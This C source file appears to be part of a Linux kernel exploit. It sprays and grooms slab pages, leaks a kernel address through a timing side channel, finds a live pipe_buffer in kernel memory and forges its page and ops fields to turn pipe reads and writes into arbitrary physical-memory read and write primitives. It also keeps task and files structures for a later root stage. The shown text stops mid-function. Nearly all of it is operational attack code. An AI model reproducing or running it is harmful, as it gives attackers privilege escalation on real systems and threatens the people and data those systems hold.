#include "common.h"

#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
#include P0_FINGERPRINT_HEADER
#endif

#define PHYSRW_PROOF_OFF 0x7000
#define PHYS_READ_TAG "nebusec_70687973727730"
#define PHYS_WRITE_TAG "nebusec_70687973727731"
#define PHYS64_SEED 0x306365737562656eULL
#define PHYS64_NEXT 0x316365737562656eULL

_Static_assert(sizeof(PHYS_READ_TAG) == sizeof(PHYS_WRITE_TAG),
               "phys proof tag sizes");

static int pipe_objects_ready;
static int pipe_fds_drain[PIPE_DRAIN][2];
static int pipe_fds_reclaim[PIPE_RECLAIM][2];
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
static int p0_gate_holders[PIPE_RECLAIM][2];
static int p0_gate_holders_initialized;

#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
static void close_p0_gate_holders(void) {
  if (!p0_gate_holders_initialized) {
    return;
  }
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    if (p0_gate_holders[i][0] >= 0) {
      close(p0_gate_holders[i][0]);
    }
    if (p0_gate_holders[i][1] >= 0) {
      close(p0_gate_holders[i][1]);
    }
    p0_gate_holders[i][0] = -1;
    p0_gate_holders[i][1] = -1;
  }
  p0_gate_holders_initialized = 0;
}
#endif
#endif

pid_t pipe_prepare_child = -1;
uint64_t kmalloc_pipe_cache;
uint64_t kmalloc_normal_1k_cache;
uint64_t kmalloc_normal_2k_cache;
uint64_t kmalloc_cgroup_1k_cache;
uint64_t kmalloc_cgroup_2k_cache;
uint64_t candidate_slab_cache;
int pipe_cache_gate_ok;
int pipe_cache_page_index = -1;
int pipe_cache_slot_hit = -1;
uint64_t pipe_page_slab_cache[PIPE_CANDIDATE_PAGES];
uint32_t pipe_page_type[PIPE_CANDIDATE_PAGES];
uintptr_t pipebuf_page_base;
uintptr_t pipebuf_addr;
int pipebuf_pipe_idx = -1;
/* Snapshot of the victim descriptor, taken ONCE when the walk accepts it and reused for
 * every forge/restore afterwards. Upstream does exactly this in
 * resolve_pipe_victim_deterministic() (09_pipe_buffer_rw.c:1704-1708):
 *     g_victim_saved = candidate; g_victim_saved_valid = 1;
 * and both pipe_rw_read_once()/pipe_rw_write_once() start from `g_victim_saved`
 * (09:1317, 09:1357) and hard-fail when it is not valid (09:1311, 09:1351).
 *
 * Reading the slot fresh each time is wrong for a subtler reason than "it gets popped":
 * pipe_read() mutates the live struct in place (buf->offset += chars, buf->len -= chars,
 * fs/pipe.c:313-314). Re-reading it mid-sequence restores a *partially consumed*
 * descriptor, not the pristine one. */
struct user_pipe_buffer pipebuf_saved;
int pipebuf_saved_valid;

/* Self task_struct + files_struct, published by the successful walk so the root stage can
 * reuse them instead of re-walking the task list (which would cost another guard cycle
 * window per task on a live slab page). */
uintptr_t pipe_walk_self_task;
uintptr_t pipe_walk_self_files;
char physrw_readback[64];
char physrw_after_write[64];
int physrw_read_ok;
int physrw_write_ok;
int pipe_scan_vmemmap;
int pipe_scan_ops;
int pipe_scan_len;
int pipe_probe_found;
uint64_t pipe_probe_page;
uint64_t pipe_probe_ops;
uint64_t pipe_probe_private;
uint32_t pipe_probe_len;
uint32_t pipe_probe_flags;
uint64_t pipe_scan_first_page;
uint64_t pipe_scan_first_ops;
uint64_t pipe_scan_q0;
uint64_t pipe_scan_q1;
uint64_t pipe_scan_q2;
uint64_t pipe_scan_q3;
uint32_t pipe_scan_first_len;
uint32_t pipe_scan_first_flags;
uint64_t physrw_read64_before;
uint64_t physrw_read64_after;
uint64_t physrw_write64_value;
int physrw_read64_ok;
int physrw_write64_ok;

void init_ctx(struct mm_ctx *ctx, size_t cnt) {
  ctx->mm_cnt = cnt;
  ctx->childs = calloc(sizeof(pid_t), cnt);
  ctx->memfds = calloc(sizeof(int), cnt);
}

void resize_pipe_slots(int pipefd[2], size_t slots) {
  SYSCHK(fcntl(pipefd[0], F_SETPIPE_SZ, slots * PAGE_SIZE));
}

void make_pipe_object(int pipefd[2]) {
  SYSCHK(pipe(pipefd));
  resize_pipe_slots(pipefd, 2);
}

void alloc_pipe_object(int pipefd[2]) {
  resize_pipe_slots(pipefd, PIPE_BUFFER_SLOTS);
}

void free_pipe_object(int pipefd[2]) {
  resize_pipe_slots(pipefd, 2);
}

uintptr_t prepare_pipe_buffer_page_child(void) {
  struct mm_ctx prep;
  struct mm_ctx spray;
  struct mm_ctx pre;
  struct mm_ctx post;
  size_t objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;

  init_ctx(&prep, 32 * objs_per_slab);
  init_ctx(&spray, (1 + MM_PARTIALS) * objs_per_slab);
  init_ctx(&pre, objs_per_slab - 1);
  init_ctx(&post, objs_per_slab);

  for (size_t i = 0; i < prep.mm_cnt; i++) {
    prep.childs[i] = -1;
    prep.memfds[i] = clone_memfd();
  }
  for (size_t i = 0; i < spray.mm_cnt; i++) {
    spray.childs[i] = -1;
    spray.memfds[i] = clone_memfd();
  }

  setup_kernelsnitch();

  for (size_t i = 0; i < pre.mm_cnt; i++) {
    pre.childs[i] = -1;
    pre.memfds[i] = clone_memfd();
  }
  pid_t leak_child = clone_leak_child();
  for (size_t i = 0; i < post.mm_cnt; i++) {
    post.childs[i] = -1;
    post.memfds[i] = clone_memfd();
  }
  int leak_memfd = open_memfd(leak_child);

  for (size_t i = 0; i < pre.mm_cnt; i++) {
    kill_child(pre.childs[i]);
  }
  for (size_t i = 0; i < post.mm_cnt; i++) {
    kill_child(post.childs[i]);
  }
  for (size_t i = 0; i < spray.mm_cnt; i++) {
    kill_child(spray.childs[i]);
  }
  SYSCHK(waitpid(leak_child, NULL, 0));

  if (!kernelsnitch_collisions_ready()) {
    pr_error("pipe KernelSnitch collision finding failed\n");
  }

  unsigned char *buf = malloc(SKB_SEND_SIZE);
  memset(buf, 0x50, SKB_SEND_SIZE);

  int skb_sv[2];
  int pcp_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, skb_sv));
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_sv));

  struct iovec iov;
  memset(&iov, 0, sizeof(iov));
  iov.iov_base = buf;
  iov.iov_len = SKB_SEND_SIZE;

  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  SYSCHK(sendmsg(pcp_sv[0], &msg, 0));
  pin_to_core(CORE);

  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  for (size_t i = 0; i < pre.mm_cnt; i++) {
    SYSCHK(close(pre.memfds[i]));
    pre.memfds[i] = -1;
  }
  for (size_t i = 0; i < post.mm_cnt - 1; i++) {
    SYSCHK(close(post.memfds[i]));
    post.memfds[i] = -1;
  }
  for (size_t i = 0; i < spray.mm_cnt; i += objs_per_slab) {
    SYSCHK(close(spray.memfds[i]));
    spray.memfds[i] = -1;
  }
  SYSCHK(close(pcp_sv[0]));
  SYSCHK(close(pcp_sv[1]));

  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  SYSCHK(close(leak_memfd));
  SYSCHK(sendmsg(skb_sv[0], &msg, 0));

  run_kernelsnitch_bruteforce();
  uintptr_t leaked = cleanup_kernelsnitch();
  if (leaked == (uintptr_t)-1) {
    pr_warning("pipe KernelSnitch sk_buff page leak failed\n");
    close_ctx_memfds(&prep);
    close_ctx_memfds(&spray);
    close_ctx_memfds(&pre);
    close_ctx_memfds(&post);
    free_ctx_storage(&prep);
    free_ctx_storage(&spray);
    free_ctx_storage(&pre);
    free_ctx_storage(&post);
    free(buf);
    return 0;
  }
  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  if (getenv("KS_LEAK_ONLY")) {
    pr_success("KernelSnitch leak-only mm=%016zx base=%016zx object_index=%zu\n",
               leaked, base, (leaked - base) / MM_STRUCT_SZ);
    fflush(NULL);
    _exit(0);
  }
#endif

  for (size_t i = 0; i < PIPE_DRAIN; i++) {
    alloc_pipe_object(pipe_fds_drain[i]);
  }

  pin_to_core(CORE);
  SYSCHK(close(skb_sv[0]));
  SYSCHK(close(skb_sv[1]));
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    alloc_pipe_object(pipe_fds_reclaim[i]);
  }

  close_ctx_memfds(&prep);
  close_ctx_memfds(&spray);
  close_ctx_memfds(&pre);
  close_ctx_memfds(&post);
  free_ctx_storage(&prep);
  free_ctx_storage(&spray);
  free_ctx_storage(&pre);
  free_ctx_storage(&post);
  free(buf);
  return base;
}

uintptr_t prepare_pipe_buffer_page(void) {
  for (size_t i = 0; i < PIPE_DRAIN; i++) {
    make_pipe_object(pipe_fds_drain[i]);
  }
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    make_pipe_object(pipe_fds_reclaim[i]);
  }
  pipe_objects_ready = 1;

  int result_pipe[2];
  SYSCHK(pipe(result_pipe));
  pid_t child = SYSCHK(fork());
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(1);
    }
    SYSCHK(close(result_pipe[0]));
    uintptr_t base = prepare_pipe_buffer_page_child();
    for (size_t i = 0; i < PIPE_DRAIN; i++) {
      close(pipe_fds_drain[i][0]);
      close(pipe_fds_drain[i][1]);
      pipe_fds_drain[i][0] = -1;
      pipe_fds_drain[i][1] = -1;
    }
    SYSCHK(write(result_pipe[1], &base, sizeof(base)));
    for (;;) {
      sleep(60);
    }
  }

  pipe_prepare_child = child;
  SYSCHK(close(result_pipe[1]));
  uintptr_t base = 0;
  ssize_t got = read(result_pipe[0], &base, sizeof(base));
  SYSCHK(close(result_pipe[0]));
  if (got != (ssize_t)sizeof(base)) {
    pr_warning("pipe page child did not report base\n");
    base = 0;
  }
  for (size_t i = 0; i < PIPE_DRAIN; i++) {
    close(pipe_fds_drain[i][0]);
    close(pipe_fds_drain[i][1]);
    pipe_fds_drain[i][0] = -1;
    pipe_fds_drain[i][1] = -1;
  }
  return base;
}

void reset_pipe_attempt(void) {
  if (pipe_prepare_child > 0) {
    kill(pipe_prepare_child, SIGKILL);
    waitpid(pipe_prepare_child, NULL, 0);
    pipe_prepare_child = -1;
  }

  if (pipe_objects_ready) {
    for (size_t i = 0; i < PIPE_DRAIN; i++) {
      close(pipe_fds_drain[i][0]);
      close(pipe_fds_drain[i][1]);
    }
    for (size_t i = 0; i < PIPE_RECLAIM; i++) {
      close(pipe_fds_reclaim[i][0]);
      close(pipe_fds_reclaim[i][1]);
    }
    pipe_objects_ready = 0;
  }

#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  close_p0_gate_holders();
#else
  if (p0_gate_holders_initialized) {
    for (size_t i = 0; i < PIPE_RECLAIM; i++) {
      if (p0_gate_holders[i][0] >= 0) {
        close(p0_gate_holders[i][0]);
      }
      if (p0_gate_holders[i][1] >= 0) {
        close(p0_gate_holders[i][1]);
      }
      p0_gate_holders[i][0] = -1;
      p0_gate_holders[i][1] = -1;
    }
    p0_gate_holders_initialized = 0;
  }
#endif
#endif

  pipebuf_page_base = 0;
  pipebuf_addr = 0;
  pipebuf_pipe_idx = -1;
  pipe_cache_gate_ok = 0;
  pipe_cache_page_index = -1;
  pipe_cache_slot_hit = -1;
  pipe_probe_found = 0;
  pipe_probe_page = 0;
  pipe_probe_ops = 0;
  pipe_probe_private = 0;
  pipe_probe_len = 0;
  pipe_probe_flags = 0;
  candidate_slab_cache = 0;
  atomic_store(&pipe_prepare_request, 0);
  atomic_store(&pipe_prepare_done, 0);
}

uintptr_t direct_to_page(uintptr_t addr) {
  uintptr_t pfn = (addr - DIRECT_MAP_BASE) >> PAGE_SHIFT;
  return VMEMMAP_START + pfn * STRUCT_PAGE_SIZE;
}

uintptr_t direct_to_head_page(int fd, uintptr_t addr) {
  uintptr_t page = direct_to_page(addr);
  uintptr_t head_addr = page + STRUCT_PAGE_COMPOUND_HEAD_OFF;
  uint64_t compound_head = kernel_read64(fd, head_addr);
  if (compound_head & 1) {
    return compound_head & ~1ULL;
  }
  return page;
}

uintptr_t page_to_direct(uintptr_t page) {
  uintptr_t pfn = (page - VMEMMAP_START) / STRUCT_PAGE_SIZE;
  return DIRECT_MAP_BASE + (pfn << PAGE_SHIFT);
}

uintptr_t pipe_buf_ops_addr(void) {
  return text_addr(ANON_PIPE_BUF_OPS);
}

int pipe_cache_matches(uint64_t slab_cache) {
  if (slab_cache == 0) {
    return 0;
  }
  if (KMALLOC_PIPE_INDEX == 10) {
    return slab_cache == kmalloc_normal_1k_cache ||
           slab_cache == kmalloc_cgroup_1k_cache;
  }
  if (KMALLOC_PIPE_INDEX == 11) {
    return slab_cache == kmalloc_normal_2k_cache ||
           slab_cache == kmalloc_cgroup_2k_cache;
  }
  return slab_cache == kmalloc_pipe_cache;
}

int pipe_reclaim_cache_gate(int fd) {
  if (!is_direct_ptr(pipebuf_page_base)) {
    return 0;
  }

  pipe_cache_page_index = -1;
  pipe_cache_slot_hit = -1;
  memset(pipe_page_slab_cache, 0, sizeof(pipe_page_slab_cache));
  memset(pipe_page_type, 0, sizeof(pipe_page_type));

  uint64_t cache_slots[KMALLOC_CACHE_SLOTS];
  memset(cache_slots, 0, sizeof(cache_slots));
  uintptr_t kmalloc_caches = data_addr(KMALLOC_CACHES);
  kernel_read_data(fd, kmalloc_caches, cache_slots, sizeof(cache_slots));
  kmalloc_normal_1k_cache =
    cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 10];
  kmalloc_normal_2k_cache =
    cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 11];
  kmalloc_cgroup_1k_cache =
    cache_slots[KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + 10];
  kmalloc_cgroup_2k_cache =
    cache_slots[KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + 11];

  kmalloc_pipe_cache =
    kernel_read64(fd, data_addr(KMALLOC_CGROUP_PIPE_SLOT));
  pr_info("pipe caches normal1k=%016zx normal2k=%016zx "
          "cgroup1k=%016zx cgroup2k=%016zx selected=%016zx\n",
          kmalloc_normal_1k_cache, kmalloc_normal_2k_cache,
          kmalloc_cgroup_1k_cache, kmalloc_cgroup_2k_cache,
          kmalloc_pipe_cache);
  for (size_t off = 0; off < ORDER3_SIZE; off += PAGE_SIZE) {
    uintptr_t page = pipebuf_page_base + off;
    uintptr_t head = direct_to_head_page(fd, page);
    uint64_t cache08 = kernel_read64(fd, head + 0x08);
    uint64_t cache10 = kernel_read64(fd, head + 0x10);
    uint64_t cache18 = kernel_read64(fd, head + 0x18);
    uint64_t cache20 = kernel_read64(fd, head + 0x20);
    uint64_t slab_cache = kernel_read64(fd, head + STRUCT_SLAB_CACHE_OFF);
    uintptr_t type_addr = head + STRUCT_PAGE_TYPE_OFF;
    uint32_t page_type = (uint32_t)kernel_read64(fd, type_addr);
    pipe_page_slab_cache[off / PAGE_SIZE] = slab_cache;
    pipe_page_type[off / PAGE_SIZE] = page_type;
    int cache_match = pipe_cache_matches(slab_cache);
    pr_info("pipe page idx=%zu page=%016zx head=%016zx "
            "cache08=%016llx cache10=%016llx cache18=%016llx "
            "cache20=%016llx type=%08x match=%d\n",
            off / PAGE_SIZE, page, head,
            (unsigned long long)cache08,
            (unsigned long long)cache10,
            (unsigned long long)cache18,
            (unsigned long long)cache20, page_type, cache_match);
    if (off == 0 || cache_match) {
      candidate_slab_cache = slab_cache;
    }
    for (int slot = 0; slot < KMALLOC_CACHE_SLOTS; slot++) {
      if (cache_slots[slot] == slab_cache) {
        pipe_cache_slot_hit = slot;
      }
    }
    if (cache_match) {
      pipebuf_page_base = page;
      pipe_cache_page_index = off / PAGE_SIZE;
      pipe_cache_gate_ok = 1;
      return 1;
    }
  }

  pipe_cache_gate_ok = 0;
  return 0;
}

int read_pipe_slab(int fd, uintptr_t base, unsigned char *slab) {
  for (size_t off = 0; off < ORDER3_SIZE; off += PIPE_SCAN_CHUNK) {
    if (kernel_read_data(fd, base + off, slab + off, PIPE_SCAN_CHUNK) !=
        PIPE_SCAN_CHUNK) {
      return 0;
    }
  }
  return 1;
}

int find_pipe_buffer(int fd, uintptr_t base) {
  unsigned char slab[ORDER3_SIZE];
  pipebuf_addr = 0;
  pipebuf_pipe_idx = -1;
  pipe_probe_found = 0;
  pipe_probe_page = 0;
  pipe_probe_ops = 0;
  pipe_probe_private = 0;
  pipe_probe_len = 0;
  pipe_probe_flags = 0;
  pipe_scan_vmemmap = 0;
  pipe_scan_ops = 0;
  pipe_scan_len = 0;
  pipe_scan_first_page = 0;
  pipe_scan_first_ops = 0;
  pipe_scan_first_len = 0;
  pipe_scan_first_flags = 0;
  pipe_scan_q0 = 0;
  pipe_scan_q1 = 0;
  pipe_scan_q2 = 0;
  pipe_scan_q3 = 0;
  if (!read_pipe_slab(fd, base, slab)) {
    return 0;
  }
  memcpy(&pipe_scan_q0, slab + 0x00, 8);
  memcpy(&pipe_scan_q1, slab + 0x08, 8);
  memcpy(&pipe_scan_q2, slab + 0x10, 8);
  memcpy(&pipe_scan_q3, slab + 0x18, 8);

  for (size_t off = 0; off + sizeof(struct user_pipe_buffer) <= ORDER3_SIZE;
       off += 8) {
    struct user_pipe_buffer pb;
    memcpy(&pb, slab + off, sizeof(pb));
    if (pb.page >= VMEMMAP_START && pb.page < VMEMMAP_END) {
      pipe_scan_vmemmap++;
      if (pipe_scan_first_page == 0) {
        pipe_scan_first_page = pb.page;
        pipe_scan_first_ops = pb.ops;
        pipe_scan_first_len = pb.len;
        pipe_scan_first_flags = pb.flags;
      }
    } else {
      continue;
    }
    if (pb.ops == pipe_buf_ops_addr()) {
      pipe_scan_ops++;
    }
    if (pb.len > 0 && pb.len <= PIPE_RECLAIM) {
      pipe_scan_len++;
    }
    if (pb.offset != 0 || pb.ops != pipe_buf_ops_addr() ||
        pb.flags != PIPE_BUF_FLAG_CAN_MERGE || pb.priv != 0) {
      continue;
    }
    if (pb.len == 0 || pb.len > PIPE_RECLAIM) {
      continue;
    }

    pipebuf_addr = base + off;
    pipebuf_pipe_idx = (int)pb.len - 1;
    pipe_probe_found = 1;
    pipe_probe_page = pb.page;
    pipe_probe_ops = pb.ops;
    pipe_probe_private = pb.priv;
    pipe_probe_len = pb.len;
    pipe_probe_flags = pb.flags;
    return 1;
  }

  return 0;
}

/* Toggle O_NONBLOCK on a pipe end so syscalls executed against a
 * patched pipe_buffer can never block past our control (see
 * pipe_phys_read). Best-effort: failure only means we skip the toggle. */
/* The restore-failure latch. Declared here because pipe_phys_read/pipe_phys_write
 * (defined above) set it: a failed descriptor or flag restore is terminal for the whole
 * attempt, exactly as the fork's PIPE_E_RESTORE is. */
static atomic_int g_io_restore_failed;

/* Deadline-bounded pipe I/O, mirroring the fork's pipe_io_bounded
 * (09_pipe_buffer_rw.c:1274-1308).
 *
 * A bare read()/write() here has no timeout at all. If the forged descriptor is wrong the
 * syscall sleeps in the kernel until the supervisor SIGKILLs us, and every restore after it
 * is skipped - leaving the live pipe_buffer patched at a foreign page, which is exactly the
 * state the next attempt must never inherit. Bounding the wait turns that silent wedge into
 * a clean failure that still runs the restore.
 *
 * Also drains short reads/writes and retries EINTR, which a single-shot syscall does not. */
#define PIPE_IO_TIMEOUT_MS 1000
static uint64_t pipe_mono_ms(void) {
  struct timespec ts;
  if (clock_gettime(CLOCK_MONOTONIC, &ts) != 0) {
    return 0;
  }
  return (uint64_t)ts.tv_sec * 1000u + (uint64_t)(ts.tv_nsec / 1000000);
}

static int pipe_io_bounded(int fd, void *buf, size_t len, int writing) {
  uint64_t deadline = pipe_mono_ms() + PIPE_IO_TIMEOUT_MS;
  unsigned char *p = (unsigned char *)buf;
  while (len) {
    ssize_t n = writing ? write(fd, p, len) : read(fd, p, len);
    if (n > 0) {
      p += n;
      len -= (size_t)n;
      continue;
    }
    if (n < 0 && errno == EINTR) {
      continue;
    }
    if (n < 0 && (errno == EAGAIN || errno == EWOULDBLOCK)) {
      uint64_t now = pipe_mono_ms();
      if (now >= deadline) {
        return 0;
      }
      struct pollfd pfd;
      memset(&pfd, 0, sizeof(pfd));
      pfd.fd = fd;
      pfd.events = writing ? POLLOUT : POLLIN;
      int pr = poll(&pfd, 1, (int)(deadline - now));
      if (pr < 0 && errno == EINTR) {
        continue;
      }
      if (pr <= 0 || (pfd.revents & (POLLERR | POLLNVAL))) {
        return 0;
      }
      continue;
    }
    return 0;
  }
  return 1;
}

/* Save the whole flag word and set O_NONBLOCK, so a syscall against a patched pipe_buffer
 * cannot block past our control. Mirrors the fork's fd_set_nonblock/fd_restore_flags
 * (09_pipe_buffer_rw.c:1264-1272).
 *
 * The previous version re-read F_GETFL and unconditionally CLEARED O_NONBLOCK on the way
 * out. That threw away the restore result, and if the restore failed the fd stayed
 * O_NONBLOCK forever - so every later read returned EAGAIN, which pipe_phys_read then
 * reported as "bad alias?". */
static int pipe_set_nonblock(int fd_, int *saved_flags) {
  *saved_flags = fcntl(fd_, F_GETFL, 0);
  return *saved_flags >= 0 && fcntl(fd_, F_SETFL, *saved_flags | O_NONBLOCK) == 0;
}

static int pipe_restore_flags(int fd_, int saved_flags) {
  return fcntl(fd_, F_SETFL, saved_flags) == 0;
}

int pipe_phys_read(
    int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr,
    void *out, size_t len) {
  struct user_pipe_buffer saved;
  struct user_pipe_buffer restored;
  size_t direct_off = direct_addr & (PAGE_SIZE - 1);
  if (!out || !len || buf_addr > UINTPTR_MAX - (sizeof(saved) - 1) ||
      (buf_addr >> PAGE_SHIFT) !=
                  ((buf_addr + sizeof(saved) - 1) >> PAGE_SHIFT) ||
      !is_direct_ptr(direct_addr) || len > PAGE_SIZE - direct_off) {
    return 0;
  }
  /* Restore baseline comes from the snapshot taken when the walk accepted this slot.
   *
   * The slot is NOT popped by a read. pipe_read() only releases the buffer and advances
   * `tail` when the buffer is FULLY consumed (fs/pipe.c:322-331: `if (!buf->len)`), and we
   * forge buf->len = count+1 against a read of `count` bytes, so buf->len is left at 1 and
   * neither pipe_buf_release() nor tail++ ever runs. head and tail are frozen for the life
   * of the primitive, so the victim stays the live ring slot indefinitely. That `+1` IS the
   * re-arm; there is deliberately no re-arm step.
   *
   * What a read DOES do is mutate the struct in place (fs/pipe.c:313-314:
   * buf->offset += chars; buf->len -= chars). So a fresh read of the slot returns a
   * partially consumed descriptor, and restoring that would leave the ring drifting further
   * from pristine on every call. Upstream avoids this the same way: g_victim_saved is
   * snapshotted once at resolve time and reused (09_pipe_buffer_rw.c:1707-1708, 1317). */
  if (pipebuf_saved_valid) {
    saved = pipebuf_saved;
  } else if (kernel_read_data(fd, buf_addr, &saved, sizeof(saved)) !=
             (ssize_t)sizeof(saved)) {
    return 0;
  }

  struct user_pipe_buffer pb = saved;  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  /* The fork sets len = len+1 on the READ forge (09:1330). A read consumes
   * len bytes from the buffer, so len+1 is what makes the read return exactly
   * `len` bytes of the target page rather than one byte too few. */
  pb.len = (uint32_t)len + 1;
  pb.ops = pipe_buf_ops_addr();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
  pb.priv = 0;

  ssize_t patch = kernel_write_data(fd, buf_addr, &pb, sizeof(pb));
  if (patch != (ssize_t)sizeof(pb)) {
    int restore = kernel_write_data(fd, buf_addr, &saved, sizeof(saved)) ==
                  (ssize_t)sizeof(saved);
    pr_error("pipe read buffer patch failed ret=%zd restore=%d\n",
             patch, restore);
    return 0;
  }

  /* The syscall below executes while the kernel pipe_buffer is patched
   * to an arbitrary physical page. Make it non-blocking for the window:
   * if the direct-map alias guess is wrong we must fail this attempt
   * cleanly and run the restore — a blocking read here would only end at
   * the supervisor SIGKILL, skipping the restore entirely (leaving the
   * patched buffer + foreign page reference behind). */
  int saved_flags = 0;
  if (!pipe_set_nonblock(pipefd[0], &saved_flags)) {
    /* Fail closed. Upstream does the same (09_pipe_buffer_rw.c:1320-1322). Previously this
     * only degraded the return value while the read() still ran, so a failed F_SETFL left a
     * deadline-free syscall against a patched buffer - the exact wedge that skips the
     * restore. Restore the descriptor and bail instead. */
    int restore = kernel_write_data(fd, buf_addr, &saved, sizeof(saved)) ==
                  (ssize_t)sizeof(saved);
    pr_error("pipe phys read nonblock setup failed restore=%d\n", restore);
    if (!restore) {
      atomic_store(&g_io_restore_failed, 1);
    }
    return 0;
  }
  int io_ok = pipe_io_bounded(pipefd[0], out, len, 0);
  if (!io_ok) {
    pr_error("pipe phys read io failed errno=%d (bad alias?)\n", errno);
  }
  int flags_restored = pipe_restore_flags(pipefd[0], saved_flags);
  int restored_ok =
      kernel_write_data(fd, buf_addr, &saved, sizeof(saved)) ==
          (ssize_t)sizeof(saved) &&
      kernel_read_data(fd, buf_addr, &restored, sizeof(restored)) == (ssize_t)sizeof(restored) &&
      memcmp(&restored, &saved, sizeof(saved)) == 0;
  /* A failed descriptor restore is TERMINAL (fork: PIPE_E_RESTORE, 09:1344). Without this
   * latch a retry re-walks on top of a slab page that may still point at our fake cache.
   * A failed flag restore is terminal for the same reason. */
  if (!restored_ok || !flags_restored) {
    atomic_store(&g_io_restore_failed, 1);
  }
  int ok = io_ok && restored_ok && flags_restored;
  if (!ok) {
    pr_error("pipe read failed io=%d restore=%d flags=%d\n",
             io_ok, restored_ok, flags_restored);
  }
  return ok;
}

int pipe_phys_write(
    int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr,
    const void *data, size_t len) {
  struct user_pipe_buffer saved;
  struct user_pipe_buffer restored;
  size_t direct_off = direct_addr & (PAGE_SIZE - 1);
  if (!data || !len || buf_addr > UINTPTR_MAX - (sizeof(saved) - 1) ||
      (buf_addr >> PAGE_SHIFT) !=
                  ((buf_addr + sizeof(saved) - 1) >> PAGE_SHIFT) ||
      !is_direct_ptr(direct_addr) || len > PAGE_SIZE - direct_off) {
    return 0;
  }
  if (pipebuf_saved_valid) {
    saved = pipebuf_saved;
  } else if (kernel_read_data(fd, buf_addr, &saved, sizeof(saved)) !=
             (ssize_t)sizeof(saved)) {
    return 0;
  }

  struct user_pipe_buffer pb = saved;
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = 0;
  pb.ops = pipe_buf_ops_addr();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
  pb.priv = 0;

  ssize_t patch = kernel_write_data(fd, buf_addr, &pb, sizeof(pb));
  if (patch != (ssize_t)sizeof(pb)) {
    int restore = kernel_write_data(fd, buf_addr, &saved, sizeof(saved)) ==
                  (ssize_t)sizeof(saved);
    pr_error("pipe write buffer patch failed ret=%zd restore=%d\n",
             patch, restore);
    return 0;
  }

  /* Same patched-window discipline as pipe_phys_read: never allow the syscall against the
   * patched buffer to block past our control, and fail closed if we cannot even make it
   * non-blocking (upstream: 09_pipe_buffer_rw.c:1369-1373). */
  int saved_flags = 0;
  if (!pipe_set_nonblock(pipefd[1], &saved_flags)) {
    int restore = kernel_write_data(fd, buf_addr, &saved, sizeof(saved)) ==
                  (ssize_t)sizeof(saved);
    pr_error("pipe phys write nonblock setup failed restore=%d\n", restore);
    if (!restore) {
      atomic_store(&g_io_restore_failed, 1);
    }
    return 0;
  }
  int io_ok = pipe_io_bounded(pipefd[1], (void *)(uintptr_t)(const void *)data, len, 1);
  if (!io_ok) {
    pr_error("pipe phys write io failed errno=%d\n", errno);
  }
  int flags_restored = pipe_restore_flags(pipefd[1], saved_flags);
  int restored_ok =
      kernel_write_data(fd, buf_addr, &saved, sizeof(saved)) ==
          (ssize_t)sizeof(saved) &&
      kernel_read_data(fd, buf_addr, &restored, sizeof(restored)) ==
          (ssize_t)sizeof(restored) &&
      memcmp(&restored, &saved, sizeof(saved)) == 0;
  if (!restored_ok || !flags_restored) {
    atomic_store(&g_io_restore_failed, 1);
  }
  int ok = io_ok && restored_ok && flags_restored;
  if (!ok) {
    pr_error("pipe write failed io=%d restore=%d flags=%d\n",
             io_ok, restored_ok, flags_restored);
  }
  return ok;
}

#if !defined(APP_EXACT_PIPE_BUFFER_ONLY) || !APP_EXACT_PIPE_BUFFER_ONLY
void forge_pipe_buffers_on_page(
    int fd, uintptr_t base, uintptr_t direct_addr, size_t len, int for_write) {
  struct user_pipe_buffer pb;
  memset(&pb, 0, sizeof(pb));
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = for_write ? 0 : len + 1;
  pb.ops = pipe_buf_ops_addr();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;

  for (size_t off = 0; off < PIPE_SLAB_SIZE; off += PIPE_OBJECT_SIZE) {
    kernel_write_data(fd, base + off, &pb, sizeof(pb));
  }
}
#endif

int pipe_phys_read_data(int fd, uintptr_t direct_addr, void *out, size_t len) {
  /* Refuse to run without a resolved victim AND its snapshot. Upstream hard-fails on the
   * same condition (09_pipe_buffer_rw.c:1311); without the snapshot we would silently fall
   * back to re-reading a struct the previous operation mutated in place. */
  if (pipebuf_page_base == 0 || pipebuf_pipe_idx < 0 || !pipebuf_addr ||
      !pipebuf_saved_valid) {
    return 0;
  }
  size_t page_off = direct_addr & (PAGE_SIZE - 1);
  if (!out || !len || len >= PAGE_SIZE || !is_direct_ptr(direct_addr) ||
      len > PAGE_SIZE - page_off) {
    return 0;
  }

  if (!pipebuf_addr) {
#if defined(APP_EXACT_PIPE_BUFFER_ONLY) && APP_EXACT_PIPE_BUFFER_ONLY
